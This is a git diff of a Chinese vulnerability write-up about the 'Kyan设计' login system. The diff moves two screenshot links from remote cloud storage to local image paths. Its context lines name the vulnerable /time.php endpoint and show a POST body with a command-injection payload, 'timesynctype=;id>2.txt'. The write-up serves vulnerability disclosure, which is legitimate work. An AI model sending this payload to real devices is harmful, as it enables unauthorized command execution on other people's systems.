@@ -20,7 +20,7 @@ app="Kyan设计"
 
 登录页面如下
 
-![image-20220519175106605](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191753857.png)
+![image-20220519175106605](./images/202205191753857.png)
 
 存在漏洞的文件: `/time.php`
 
@@ -278,4 +278,4 @@ POST /time.php
 timesynctype=;id>2.txt
 ```
 
-![image-20220519175346874](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191753984.png)
+![image-20220519175346874](./images/202205191753984.png)
